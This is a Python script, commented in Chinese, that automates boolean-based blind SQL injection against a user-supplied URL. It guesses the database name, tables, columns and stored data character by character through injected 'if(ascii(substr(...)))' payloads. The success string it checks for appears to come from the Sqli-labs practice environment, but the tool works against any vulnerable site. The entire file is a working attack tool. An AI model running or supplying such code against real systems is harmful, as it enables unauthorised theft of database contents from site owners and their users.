#coding:utf-8
import requests
import optparse

DBName=''
DBTables=[]
DBColumns=[]
DBData={}
flag='You are in...........'

requests.adapters.DEFAULT_RETRIES=5
conn=requests.session()
conn.keep_alive=False

def GetDBName(url):
    global DBName
    print('[-] 开始获取数据库的长度')
    DBNameLen=0
    payload="' and if (length(database())={0},1,0) %23"
    targetUrl=url+payload
    for DBNameLen in range(1,99):
        res=conn.get(targetUrl.format(DBNameLen))
        if flag in res.content.decode('utf-8'):
            print('[+] 数据库的长度：'+ str(DBNameLen))
            break
    print('[-] 开始获取数据库名')
    payload="' and if(ascii(substr(database(),{0},1))={1},1,0) %23"
    targetUrl=url+payload
    for a in range(1,DBNameLen+1):
        for b in range(33,127):
            res=conn.get(targetUrl.format(a,b))
            if flag in res.content.decode('utf-8'):
                DBName+=chr(b)
                print("[-]"+DBName)
                break

def GetDBTables(url,dbname):
    global DBTables
    DBTablesCount=0
    print('[-] 开始获取{0}数据库表数量：'.format(dbname))
    payload="' and if((select count(*)table_name from information_schema.tables where table_schema='{0}')={1},1,0) %23"
    targetUrl = url + payload
    for DBTablesCount in range(1,99):
        res=conn.get(targetUrl.format(dbname,DBTablesCount))
        if flag in res.content.decode('utf-8'):
            print("[-] {0}数据库中表的数量为:{1}".format(dbname,DBTablesCount))
            break
    print('[-] 开始获取{0}数据库的表'.format(dbname))

    tableLen=0
    #a 表示当前正在获取表的索引
    for a in range(0,DBTablesCount):
        print('[-] 正在获取第{0}个表名'.format(a+1))
        for tableLen in range(1,99):
            payload2="' and if((select LENGTH(table_name) from information_schema.tables where table_schema='{0}' limit {1},1)={2},1,0) %23"
            targetUrl2=url+payload2
            res2=conn.get(targetUrl2.format(dbname,a,tableLen))
            if flag in res2.content.decode('utf-8'):
                break
        table=''
            #b 表示当前表名猜解的位置
        for b in range(1,tableLen+1):
            payload3="' and if(ascii(substr((select table_name from information_schema.tables where table_schema='{0}' limit {1},1),{2},1))={3},1,0) %23"
            targetUrl3=url+payload3
            #c 表示在ASCII码中33-126位可显示的字符
            for c in range(33,127):
                res3=conn.get(targetUrl3.format(dbname,a,b,c))
                if flag in res3.content.decode('utf-8'):
                    table+=chr(c)
                    print(table)
                    break
        DBTables.append(table)
            #清空 用来获取下一个表名
        table=""

def GetDBColumns(url,dbname,dbtable):
    global DBColumns
    #存放字段数量的变量
    DBColumnCount = 0
    print("[-]开始获取{0}数据表的字段数:".format(dbtable))
    for DBColumnCount in range(99):
        payload = "' and if((select count(column_name) from information_schema.columns where table_schema='{0}' and table_name='{1}')={2},1,0) %23"
        targetUrl = url + payload
        res = conn.get(targetUrl.format(dbname, dbtable, DBColumnCount))
        if flag in res.content.decode("utf-8"):
            print("[-]{0}数据表的字段数为:{1}".format(dbtable, DBColumnCount))
            break
    #开始获取字段的名称
    #保存字段名的临时变量
    column=''
    #a表示当前获取字段的索引
    for a in range(0,DBColumnCount):
        print('[-] 正在获取第{0}个字段名'.format(a+1))
        #先获取字段的长度
        for columnLen in range(99):
            payload2 = "' and if((select LENGTH(column_name) from information_schema.columns where table_schema='{0}' and table_name='{1}' limit {2},1)={3},1,0) %23"
            targetUrl2=url+payload2
            res2=conn.get(targetUrl2.format(dbname,dbtable,a,columnLen))
            if flag in res2.content.decode('utf-8'):
                break
        #b表示当前字段名猜解的位置
        for b in range(1,columnLen+1):
            payload3="' and if(ascii(substr((select column_name from information_schema.columns where table_schema='{0}' and table_name='{1}' limit {2},1),{3},1))={4},1,0) %23"
            targetUrl3=url+payload3
            #c表示在ASXII码中33-126位可显示的字符
            for c in range(33,127):
                res3=conn.get(targetUrl3.format(dbname,dbtable,a,b,c))
                if flag in res3.content.decode('utf-8'):
                    column+=chr(c)
                    print(column)
                    break
        #把获取到的字段名加入DBColumns
        DBColumns.append(column)
        #清空column，获取下一个字段名
        column=''

def GetDBData(url,dbtable,dbcolumn):
    global DBData
    #先获取字段的数据数量
    DBDataCount=0
    print("[-]开始获取{0}数据表{1}字段的数据数量:".format(dbtable,dbcolumn))
    for DBDataCount in range(99):
        payload="' and if((select count({0}) from {1})={2},1,0) %23"
        targetUrl=url+payload
        res=conn.get(targetUrl.format(dbcolumn,dbtable,DBDataCount))
        if flag in res.content.decode('utf-8'):
            print("[-]{0}数据表{1}字段的数据数量为:{2}".format(dbtable, dbcolumn,DBDataCount))
            break
    for a in range(0,DBDataCount):
        print('[-] 正在获取第{0}的第{1}个数据'.format(dbcolumn,a + 1))
        #先获取这个数据的长度
        dataLen=0
        for dataLen in range(99):
            payload2="' and if((select length({0}) from {1} limit {2},1)={3},1,0) %23"
            targetUrl2=url+payload2
            res2=conn.get(targetUrl2.format(dbcolumn,dbtable,a,dataLen))
            if flag in res2.content.decode('utf-8'):
                print("[-]第{0}个数据长度为：{1}".format(a+1,dataLen))
                break
        #临时存放数据内容变量
        data=''
        #开始获取数据的具体内容
        #b表示当前数据内容猜解的位置
        for b in range(1,dataLen+1):
            for c in range(33,127):
                payload3="' and if (ascii(substr((select {0} from {1} limit {2},1),{3},1))={4},1,0) %23"
                targetUrl3=url+payload3
                res3=conn.get(targetUrl3.format(dbcolumn,dbtable,a,b,c))
                if flag in res3.content.decode('utf-8'):
                    data += chr(c)
                    print(data)
                    break
        DBData.setdefault(dbcolumn,[]).append(data)
        print(DBData)
        #把data情况，继续获取下一条数据
        data=''

def StartSqli(url):
    GetDBName(url)
    print('[+] 当前数据库名：{0}'.format(DBName))
    GetDBTables(url,DBName)
    print('[+] 数据库 {0} 的表如下：'.format(DBName))
    for item in range(len(DBTables)):
        print("("+str(item+1)+")"+DBTables[item])
    tableIndex=int(input('[*] 请输入要查看的表的序号'))-1
    print(DBTables[tableIndex])
    GetDBColumns(url,DBName,DBTables[tableIndex])
    while True:
        print("[+] 数据表 {0} 的字段如下：".format(DBTables[item]))
        for item in range(len(DBColumns)):
            print("(" + str(item + 1) + ")" + DBColumns[item])
        columnIndex=int(input('[*] 请输入要查看的字段的序号(输入0退出)：'))-1
        if (columnIndex == -1):
            break
        else:
            GetDBData(url,DBTables[tableIndex],DBColumns[columnIndex])

if __name__ == '__main__':
    try:
        parse=optparse.OptionParser('python3 %prog -u url\n')
        parse.add_option('-u',dest='targetURL')
        options,args=parse.parse_args()
        StartSqli(options.targetURL)
    except TypeError:
        print('python3 SQLinjection.py -u url\n')
